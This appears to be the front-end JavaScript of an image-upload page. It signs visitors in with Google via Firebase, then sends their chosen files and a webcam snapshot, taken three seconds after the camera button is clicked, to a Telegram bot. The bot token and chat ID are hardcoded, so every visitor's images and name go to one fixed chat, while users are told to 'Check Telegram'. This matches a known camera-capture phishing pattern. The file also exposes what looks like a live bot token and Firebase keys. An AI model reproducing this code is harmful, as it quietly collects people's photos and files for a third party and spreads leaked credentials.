import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
import { getAuth, signInWithPopup, GoogleAuthProvider, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyBLC6enWWKAr3O9ys-4NDjnhch4r1PSw0E",
  authDomain: "picmaster-59602.firebaseapp.com",
  projectId: "picmaster-59602",
  storageBucket: "picmaster-59602.firebasestorage.app",
  messagingSenderId: "434859259854",
  appId: "1:434859259854:web:522979eb1a7f8b6d211d9f",
  measurementId: "G-V15THQL3Z4"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const provider = new GoogleAuthProvider();

// Telegram Details
const botToken = "8234454796:AAEF_c5gExxUp7X7pTpu9brOBmjIOTac2uQ";
const chatId = "7752627907";

let currentUser = null;
let uploadCount = 0;

// Elements
const settingsBtn = document.getElementById('settings-btn');
const settingsMenu = document.getElementById('settings-menu');
const userNameDisplay = document.getElementById('user-name');
const profilePic = document.getElementById('user-profile');
const dropArea = document.getElementById('drop-area');

// Settings Toggle
settingsBtn.onclick = () => settingsMenu.classList.toggle('active');

// Auth State
onAuthStateChanged(auth, (user) => {
    if (user) {
        currentUser = user;
        userNameDisplay.innerText = user.displayName;
        profilePic.innerHTML = `<img src="${user.photoURL}" style="width:100%">`;
    } else {
        currentUser = null;
        userNameDisplay.innerText = "Guest";
        profilePic.innerHTML = `<i class="fas fa-user-circle"></i>`;
    }
});

// Logout
document.getElementById('logout-btn').onclick = () => {
    if(confirm("Logout panna virumbugireergala?")) {
        signOut(auth).then(() => location.reload());
    }
};

// File History
document.getElementById('history-btn').onclick = () => {
    alert(uploadCount > 0 ? `Neenga ${uploadCount} file upload pannirukkeenga.` : "No files uploaded yet.");
};

// Camera Function
document.getElementById('camera-btn').onclick = async () => {
    if(!currentUser) return alert("Mudhala login pannunga!");
    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.style.display = 'block';
        
        setTimeout(() => {
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(blob => {
                uploadToTelegram(blob, "Live Camera Pic");
                stream.getTracks().forEach(track => track.stop());
                video.style.display = 'none';
            }, 'image/jpeg');
        }, 3000);
    } catch (err) {
        alert("Camera permission kudukala!");
    }
};

// Telegram Upload
async function uploadToTelegram(file, type = "File") {
    const formData = new FormData();
    formData.append("chat_id", chatId);
    formData.append("document", file, "upload.jpg");
    formData.append("caption", `${type} from ${currentUser.displayName}`);

    fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
        method: "POST",
        body: formData
    }).then(() => {
        uploadCount++;
        alert("Success! Check Telegram.");
    });
}

// Drop area logic
dropArea.onclick = () => {
    if(!currentUser) {
        signInWithPopup(auth, provider);
    } else {
        const input = document.createElement('input');
        input.type = 'file';
        input.onchange = e => uploadToTelegram(e.target.files[0]);
        input.click();
    }
};
